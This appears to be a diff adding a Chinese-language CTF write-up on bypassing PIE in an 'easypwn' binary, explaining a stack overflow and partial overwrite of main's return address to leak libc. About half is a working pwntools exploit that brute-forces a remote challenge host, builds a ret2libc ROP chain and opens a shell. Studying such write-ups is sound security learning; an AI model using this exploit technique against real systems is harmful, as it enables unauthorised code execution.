@@ -1,0 +1,38 @@
+1.pie绕过的俩种方式
+#心得:pie保护和aslr保护相同，只是保证了不同块的整体块偏移从而让攻击者不知道真实地址头疼，但是整体块内的所有结构偏移都是相同的，所以我们只需要知道一个函数的真实地址和它的偏移，我们就泄漏了整体块的基地址。
+题目中有栈溢出，没有canary，其余保护全开,memcpy(buffer,s,s_length)中s_length是strlen()完成的，所以存在截断问题
+唯一的阻力在于开了pie,由于size大于idx时补了\x00,没法泄漏。触发栈溢出时，read_n返回地址正常(ret),因为垃圾数据填充在了main函数栈针。但是main函数的ret是libc_start_main+offset，而且距离它-0x20处有一个push rbp，这个地址确实是main的起始地址.
+那么我们就有了思路，read_n函数触发栈溢出填充垃圾数据到main函数栈针，并且将main函数的返回地址覆盖低3字节(因为我们覆盖的是libc_start_main+offset的地址，所以找的gadget片段在libc中。由于aslr的存在，gadget片段是偏移地址),那么由于截断问题以及爆破通过puts函数泄漏出gadget@libc的地址，并且main函数ret时成功劫持到main函数，这样就即泄漏了libc的地址(有了system的地址)，也成功利用栈溢出再次构造栈溢出，按照这样的原理再次ROP就可以拿到shell
+#这里有一个需要注意的问题，leak出的libc不一定是正确的，但是爆破成功的地址一定是正确的。因为覆盖了低位，puts时就打印出了gadget@libc的地址，gadget@libc-gadget@offset就是libc的基地址.
+
+def ret2main():
+    ###leak base&&ret2main###
+    payload = 'A' * 0x88 + '\x51' + '\x13'
+    sendline(payload)
+    libc_base = u64(recvuntil('\x7f')[-6:-1].ljust(8,'\x00')) - 0x0000000000021351
+    success("libc_base:"+hex(libc_base))
+    return libc_base
+while(1):
+    if(sys.argv[1] == 'l'):
+        p = process('./easypwn')
+        elf = ELF('./easypwn',checksec=False)
+        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
+    else:
+        p = remote("nc.eonew.cn","10004")
+        elf = ELF('./easypwn',checksec=False)
+        libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
+    try:
+        libc_base = ret2main()
+        system = libc_base + 0x4f322
+        sh = libc_base + next(libc.search(b'/bin/sh\x00'))
+        pop_rdi_ret = libc_base + 0x000000000002155f
+        success("system:"+hex(system))
+        success("bin:"+hex(sh))
+
+        sleep(0.3)
+        payload = b'A' * 0x88+p64(pop_rdi_ret)+p64(sh)+p64(system)
+        sendline(payload)
+        sendline('ls')
+        interactive()
+    except:
+        pass
